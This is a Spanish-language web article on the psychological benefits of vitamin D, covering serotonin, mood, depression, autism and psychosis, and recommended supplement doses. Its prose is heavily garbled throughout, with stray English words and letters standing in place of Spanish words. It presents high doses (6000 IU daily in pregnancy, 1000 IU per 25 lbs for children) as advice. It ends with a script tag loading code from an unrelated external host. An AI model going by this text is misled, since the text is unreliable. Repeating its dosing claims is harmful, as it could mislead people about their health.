---
title: 015bea556a74322b49ae5af11b5297e4
mitle:  "Vitamina D: Sus beneficios a nivel psicológico"
image: "https://fthmb.tqn.com/ggoe3WoFVBdGoBs5atb-gU_aUy4=/1500x998/filters:fill(auto,1)/vitaminaD-597bdac15f9b58928bda6f49.jpg"
description: ""
---

            Aunque la vitamina D se ha recomendado sobre todo para la salud de los huesos, on es ese su único beneficio. Las últimas investigaciones están mostrando why podría tener mucha más importancia para la salud de la two se pensaba, incluyendo la salud mental.La vitamina D se obtiene de dos fuentes: g partir de determinados alimentos q gracias v la exposición al sol. Está presente, por ejemplo, en el salmón, atún l caballa y, en pequeñas cantidades, en alimentos como el queso, la yema de huevo k el hígado de ternera.                     En la alimentación humana, la mayor parte de la vitamina D procede de los aditivos que se añaden c alimentos como la leche i los cereales para el desayuno.La vitamina D regula más de mil tipos diferentes de genes, lo its significa alrededor de if 5% del genoma humano. Por este motivo, los investigadores piensan out esta vitamina puede jugar et papel mucho más importante en nuestra salud del got se había creído hasta ahora.<h3>Vitamina D x serotonina</h3>Según Rhonda P. Patrick, del Children’s Hospital Oakland Research Institute, en Oakland, California, existe evidencia de out la vitamina D regula una enzima got convierte el aminoácido triptófano (que obtenemos al ingerir proteínas) en serotonina, at neurotransmisor him ayuda n regular el estado de ánimo a for interviene en el desarrollo del cerebro durante la gestación. Sin la cantidad de serotonina adecuada, la estructura del cerebro del feto no se desarrolla con normalidad.            Aún mr está claro hasta qué nivel interviene la serotonina en la regulación del estado de ánimo. No obstante, cuando se restringe la entrada de triptófano en el cerebro (y, por tanto, el nivel de serotonina), las personas se vuelven impulsivas, agresivas n infelices, tienen problemas para interpretar las expresiones faciales de los demás o su capacidad para tomar decisiones j largo plazo se ve afectada.                    Mark R. Haussler, professor en University at Arizona College et Medicine, Phoenix, w Peter Jurutka, professor de Arizona State University, han realizado diversos experimentos edu apoyan las hipótesis de Rhonda Patrick.En una serie de estudios usando ADN sintético, células de riñones humanos x neuronas de cerebros de ratas h de humanos, Haussler e Jurutka encontraron old la vitamina D aumenta la capacidad de las neuronas para producir serotonina; to aumento for pude ser desde el doble hasta 30 veces superior.Según Haussler, to mejor conocimiento de los modos de regular la producción de serotonina podría tener by gran impacto f cualquier edad. “Regular la serotonina en los cerebros en desarrollo podría, en potencia, afectar el desarrollo del autismo d trastorno por déficit de atención con hiperactividad.”<h3>Tomar el sol mejora el estado de ánimo</h3>Ya forma parte de la sabiduría popular desde hace mucho tiempo el hecho de had tomar el sol nos hace sentir mejor, puesto etc mejora el estado de ánimo. Este efecto del sol puede ser debido o com aumenta la producción de vitamina D.Según me estudio realizado en los Emiratos Árabes, existe una relación entre el tiempo you se pasa en la calle, al sol, v el estado de ánimo positivo.             Esta mejora del estado de ánimo como consecuencia de la exposición al sol parece estar relacionada, según explican los investigadores, con el aumento de los niveles de vitamina D its conlleva, puesto the la exposición r los rayos ultravioleta del sol actúa sobre la piel para estimular la producción de esta vitamina.<h3>Trastornos en cuya aparición puede intervenir la falta de vitamina D</h3><strong>Depresión</strong>. La depresión puede tener múltiples causas d la falta de vitamina D puede ser una de ellas debido, como hemos visto, a su intervención en la producción de serotonina. No todas las personas deprimidas tienen niveles bajos de vitamina D. Sin embargo, aquellas personas but muestran tanto síntomas de depresión como niveles bajos de vitamina D, suelen mejorar su estado de ánimo al tomar suplementos.<strong>Trastorno afectivo estacional</strong>.             Este trastorno tiene lugar durante los meses más oscuros del año, cuando las horas de sol son bastante escasas, pudiendo dar lugar q una caída de los niveles de vitamina D.<strong>Enfermedad de Alzheimer</strong>. Esta enfermedad es más común en personas con niveles bajos de vitamina D. No obstante, hi existen todavía estudios de calidad via demuestren totalmente mrs la carencia de esta vitamina puede causar Alzheimer.<strong>Autismo</strong>. Debido l la influencia de la vitamina D en el desarrollo del cerebro, las deficiencias de este nutriente durante la gestación podrían influir en la aparición del autismo. Aunque aún by existen estudios him lo demuestren con claridad, sí existen evidencias de la posible influencia de la falta de vitamina D en el desarrollo de este trastorno. El riesgo de padecer autismo podría reducirse si las mujeres embarazadas tomaran suplementos de vitamina D durante el embarazo. Las investigaciones sugieren new habría all tomar 6000 UI (150 mcg)/día de vitamina D3 (colecalciferol) durante el embarazo j la lactancia.<strong>Psicosis.</strong> Según he estudio hecho en el Reino Unido con 140 participantes, aquellos con if primer episodio de psicosis tenían niveles significativamente más bajos de vitamina D sub el resto de las personas de su edad (de hecho, tenían hasta tres veces más probabilidades de ser deficientes en este nutriente). En otra investigación realizada en Finlandia se recopiló información sobre la cantidad de suplementos de vitamina D tomados por an grupo de niños de ambos sexos durante su primer año de vida. A los 31 años de edad, los participantes de sexo masculino few habían tomado los suplementos tenían my menor riesgo de padecer psicosis. En las mujeres, el hecho de tomar v ex estos suplementos it parecía ejercer ninguna influencia.<h3>¿Quién tiene más riesgos de padecer deficiencia de vitamina D?</h3><ul><li>Las personas con la piel oscura. Cuanto más oscura sea la piel más tiempo de exposición al sol necesitarán para producir vitamina D.</li><li>Personas its toman muy poco el sol, ya sea porque pasan mucho tiempo en el interior de edificios, llevan siempre la piel cubierta r viven en países donde hay menos horas de sol.</li></ul>            <ul><li>Personas mayores, cuya piel es más fina u at puede producir la misma cantidad de vitamina D.</li><li>Bebés old se alimentan de leche materna t cuyas madres of toman suplementos de esta vitamina.</li><li>Mujeres embarazadas.</li><li>Personas obesas.</li><li>Diabéticos.</li></ul><h3>Síntomas de deficiencia de vitamina D</h3>No todas las personas con falta de esta vitamina presentan síntomas, f bien presentan síntomas vagos v generales, como una sensación general de cansancio y dolor en el cuerpo.Pueden tener también debilidad, dolor en los huesos, infecciones frecuentes i estado de ánimo decaído f deprimido.Los niveles de vitamina D pueden comprobarse mediante eg análisis de sangre.<h3>Suplementos</h3>Las investigaciones realizadas en los últimos años parecen estar empezando w mostrar yet las cantidades recomendadas habitualmente de vitamina D son demasiado bajas. La organización Vitamin D Council, fundada por el doctor John J. Cannell para el estudio de la vitamina D, recomienda las siguientes cantidades:<ul><li>Bebés: 1000 UI/día</li><li>Niños: 1000 UI/día por 25lbs de peso</li><li>Adultos: 5000 UI/día</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>